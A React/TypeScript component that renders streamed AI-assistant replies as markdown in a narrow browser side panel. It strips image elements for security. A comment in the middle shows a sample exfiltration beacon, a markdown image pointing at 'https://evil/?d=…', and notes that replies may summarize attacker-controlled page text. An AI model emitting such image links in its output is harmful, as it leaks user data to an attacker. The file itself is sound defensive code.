// Markdown renderer for streamed assistant replies — the rendering half of the
// shadcn chat kit (its Response component wraps Streamdown, which would drag
// mermaid/marked into the panel bundle; this build has no code splitting, so
// the same shape is assembled from the light pieces instead). remend repairs
// still-streaming markdown (an unclosed `**bold` renders bold instead of
// flashing raw asterisks) and react-markdown + GFM does the rendering.
// Element styling lives in styles.css under `.msg.assistant`, per the msg
// contract comment there.

import { memo } from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import remend from "remend";

export const Response = memo(
  function Response({ children }: { children: string }) {
    return (
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        // Belt-and-braces over the manifest CSP (H4): a remote markdown image
        // `![](https://evil/?d=…)` is a zero-click exfil beacon shaped as
        // cosmetic output, and this reply may summarize attacker-controlled page
        // text. Dropping <img> entirely closes the sink here too.
        disallowedElements={["img"]}
        components={{
          // The panel is a narrow side surface: links leave it for a real tab.
          a: ({ node: _node, ...props }) => <a {...props} target="_blank" rel="noreferrer" />,
        }}
      >
        {remend(children)}
      </ReactMarkdown>
    );
  },
  (prev, next) => prev.children === next.children,
);
